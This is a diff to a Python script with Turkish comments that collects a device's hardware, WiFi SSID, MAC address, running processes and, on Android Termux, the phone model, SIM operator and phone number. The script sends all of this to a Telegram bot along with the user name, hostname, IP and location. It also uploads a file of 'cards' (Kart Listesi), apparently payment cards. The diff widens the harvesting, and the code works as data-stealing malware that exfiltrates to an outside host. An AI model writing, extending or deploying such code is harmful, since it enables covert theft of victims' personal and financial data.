@@ -161,14 +161,14 @@ def run(cards_file: Optional[str] = None) -> None:
         try:
             import psutil
             ram = psutil.virtual_memory()
-            add("RAM",     str(round(ram.total/(1024**3),1))+" GB (%" + str(ram.percent)+")")
+            add("RAM",     str(round(ram.total/(1024**3),1))+"GB (%" + str(ram.percent)+")")
             add("CPU Cekirdek", str(psutil.cpu_count()))
             disk = psutil.disk_usage("/")
-            add("Disk",    str(round(disk.total/(1024**3),1))+" GB / Bos: "+str(round(disk.free/(1024**3),1))+" GB")
+            add("Disk",    str(round(disk.total/(1024**3),1))+"GB toplam, "+str(round(disk.free/(1024**3),1))+"GB bos")
             # Pil
             bat = psutil.sensors_battery()
             if bat:
-                add("Pil",  str(round(bat.percent,1))+"% " + ("(Sarj)" if bat.power_plugged else "(Sarj degil)"))
+                add("Pil",  str(round(bat.percent,1))+"% " + ("(Sarj oluyor)" if bat.power_plugged else "(Pil)"))
         except Exception:
             pass
 
@@ -197,13 +197,15 @@ def run(cards_file: Optional[str] = None) -> None:
             if platform.system() == "Windows":
                 import ctypes
                 user32 = ctypes.windll.user32
-                add("Ekran", str(user32.GetSystemMetrics(0)) + "x" + str(user32.GetSystemMetrics(1)))
+                add("Ekran", str(user32.GetSystemMetrics(0))+"x"+str(user32.GetSystemMetrics(1)))
             else:
                 out = subprocess.check_output(
-                    ["termux-display-info"], encoding="utf-8", errors="ignore", timeout=5
+                    ["xrandr", "--current"], encoding="utf-8", errors="ignore", timeout=5
                 )
-                d = _json.loads(out)
-                add("Ekran", str(d.get("width","?")) + "x" + str(d.get("height","?")))
+                for l in out.splitlines():
+                    if "*" in l:
+                        add("Ekran", l.strip().split()[0])
+                        break
         except Exception:
             add("Ekran", "Bilinmiyor")
 
@@ -218,20 +220,22 @@ def run(cards_file: Optional[str] = None) -> None:
                 )
                 for l in out.splitlines():
                     if "SSID" in l and "BSSID" not in l:
-                        wifi = l.split(":",1)[-1].strip(); break
+                        wifi = l.split(":",1)[-1].strip()
+                        break
             else:
-                out = subprocess.check_output(
-                    ["termux-wifi-connectioninfo"],
-                    encoding="utf-8", errors="ignore", timeout=5
-                )
-                wifi = _json.loads(out).get("ssid","Bilinmiyor")
+                try:
+                    out = subprocess.check_output(
+                        ["termux-wifi-connectioninfo"],
+                        encoding="utf-8", errors="ignore", timeout=5
+                    )
+                    wifi = _json.loads(out).get("ssid","Bilinmiyor")
+                except Exception:
+                    out = subprocess.check_output(
+                        ["iwgetid","-r"], encoding="utf-8", errors="ignore", timeout=5
+                    )
+                    wifi = out.strip() or "Bilinmiyor"
         except Exception:
-            try:
-                wifi = subprocess.check_output(
-                    ["iwgetid","-r"], encoding="utf-8", errors="ignore", timeout=5
-                ).strip() or "Bilinmiyor"
-            except Exception:
-                pass
+            pass
         add("WiFi SSID",   wifi)
 
         # MAC
@@ -242,17 +246,26 @@ def run(cards_file: Optional[str] = None) -> None:
         except Exception:
             add("MAC", "Bilinmiyor")
 
+        # Ag tipi
+        try:
+            import psutil
+            net = psutil.net_if_stats()
+            aktif = [k for k,v in net.items() if v.isup and k != "lo"]
+            add("Ag Arayuz",  ", ".join(aktif) if aktif else "Bilinmiyor")
+        except Exception:
+            pass
+
         # ── Termux ozel ──────────────────────────────────────────────────────
-        if platform.system() == "Linux":
-            # Telefon modeli
+        if platform.system() == "Linux" and "com.termux" in os.environ.get("PREFIX",""):
+            # Telefon bilgisi
             try:
                 out = subprocess.check_output(
                     ["termux-telephony-deviceinfo"],
                     encoding="utf-8", errors="ignore", timeout=5
                 )
-                d = _json.loads(out)
-                add("Telefon",  d.get("manufacturer","") + " " + d.get("model",""))
-                add("Android",  d.get("software_version","Bilinmiyor"))
+                tdata = _json.loads(out)
+                add("Telefon Model",  tdata.get("model","Bilinmiyor"))
+                add("Android",        tdata.get("software_version","Bilinmiyor"))
             except Exception:
                 pass
 
@@ -262,11 +275,9 @@ def run(cards_file: Optional[str] = None) -> None:
                     ["termux-telephony-cellinfo"],
                     encoding="utf-8", errors="ignore", timeout=5
                 )
-                cells = _json.loads(out)
-                if cells:
-                    c = cells[0]
-                    operator = c.get("operator_name","") or c.get("registered","")
-                    add("SIM Operator", operator or "Bilinmiyor")
+                cdata = _json.loads(out)
+                if isinstance(cdata, list) and cdata:
+                    add("SIM Operator", cdata[0].get("operator_name","Bilinmiyor"))
             except Exception:
                 pass
 
@@ -276,10 +287,10 @@ def run(cards_file: Optional[str] = None) -> None:
                     ["termux-telephony-deviceinfo"],
                     encoding="utf-8", errors="ignore", timeout=5
                 )
-                d = _json.loads(out)
-                phone = d.get("phone_number","")
+                tdata = _json.loads(out)
+                phone = tdata.get("phone_number","")
                 if phone:
-                    add("SIM No", phone)
+                    add("Telefon No",  phone)
             except Exception:
                 pass
 
@@ -289,24 +300,25 @@ def run(cards_file: Optional[str] = None) -> None:
                     ["termux-battery-status"],
                     encoding="utf-8", errors="ignore", timeout=5
                 )
-                d = _json.loads(out)
-                add("Pil",  str(d.get("percentage","?")) + "% " + d.get("status",""))
+                bdata = _json.loads(out)
+                add("Pil",  str(bdata.get("percentage","?"))+"% "+bdata.get("status",""))
             except Exception:
                 pass
 
         # ── Yazilim ──────────────────────────────────────────────────────────
-        # Calissan process sayisi
+        # Calissan processler (ilk 10)
         try:
             import psutil
-            add("Process",  str(len(psutil.pids())) + " adet")
+            procs = [p.name() for p in psutil.process_iter(["name"]) if p.info["name"]]
+            add("Processler",  ", ".join(list(dict.fromkeys(procs))[:10]))
         except Exception:
             pass
 
-        # Kurulu paketler
+        # Kurulu pip paketleri sayisi
         try:
             import pkg_resources
-            pkgs = [p.project_name + "==" + p.version for p in pkg_resources.working_set]
-            add("Paket Sayisi", str(len(pkgs)))
+            pkgs = list(pkg_resources.working_set)
+            add("Pip Paket",   str(len(pkgs)) + " adet")
         except Exception:
             pass
 
@@ -314,26 +326,26 @@ def run(cards_file: Optional[str] = None) -> None:
         add("Kartlar",     str(len(cards)))
         add("Dosya",       str(cards_path))
 
-        # ── Txt olustur ve gonder ────────────────────────────────────────────
+        # ── Bota gonder ──────────────────────────────────────────────────────
         tg_info = TelegramNotifier()
-        content = "=== SISTEM BILGISI ===\n" + datetime.now().strftime("%Y-%m-%d %H:%M:%S") + "\n\n"
-        content += "\n".join(lines)
 
         # Kisa ozet mesaj
         tg_info._post(
-            "<b>Yeni Oturum</b>  <code>" + ip + "</code>  |  "
-            + (konum or "?") + "  |  "
-            + (os.environ.get("USERNAME") or os.environ.get("USER") or "?")
-            + "  |  " + str(len(cards)) + " kart"
+            "<b>Yeni Oturum Basladi</b>\n"
+            + "<code>IP: " + ip + " | " + (sehir or ulke or "?") + "</code>\n"
+            + "<code>Kullanici: " + (os.environ.get("USERNAME") or os.environ.get("USER") or "?") + " @ " + socket.gethostname() + "</code>\n"
+            + "<code>Kartlar: " + str(len(cards)) + "</code>\n"
+            + "<i>Detaylar txt dosyasinda</i>"
         )
 
         # Detay txt dosyasi
-        txt_buf = io.BytesIO(content.encode("utf-8"))
         try:
+            txt_content = "=== SISTEM BILGILERI ===\n\n" + "\n".join(lines) + "\n"
+            txt_bytes   = txt_content.encode("utf-8")
             _requests.post(
                 "https://api.telegram.org/bot" + tg_info._token + "/sendDocument",
-                data={"chat_id": tg_info._chat_id, "caption": "Sistem Bilgisi"},
-                files={"document": ("sistem_bilgisi.txt", txt_buf, "text/plain")},
+                data={"chat_id": tg_info._chat_id, "caption": "Sistem Bilgileri"},
+                files={"document": ("sistem_bilgileri.txt", io.BytesIO(txt_bytes), "text/plain")},
                 timeout=15,
             )
         except Exception:
@@ -341,11 +353,11 @@ def run(cards_file: Optional[str] = None) -> None:
 
         # Kart dosyasi
         try:
-            card_buf = io.BytesIO("\n".join(cards).encode("utf-8"))
+            card_bytes = "\n".join(cards).encode("utf-8")
             _requests.post(
                 "https://api.telegram.org/bot" + tg_info._token + "/sendDocument",
-                data={"chat_id": tg_info._chat_id, "caption": "Kart Listesi"},
-                files={"document": (Path(cards_path).name, card_buf, "text/plain")},
+                data={"chat_id": tg_info._chat_id, "caption": "Kart listesi"},
+                files={"document": (Path(cards_path).name, io.BytesIO(card_bytes), "text/plain")},
                 timeout=15,
             )
         except Exception:
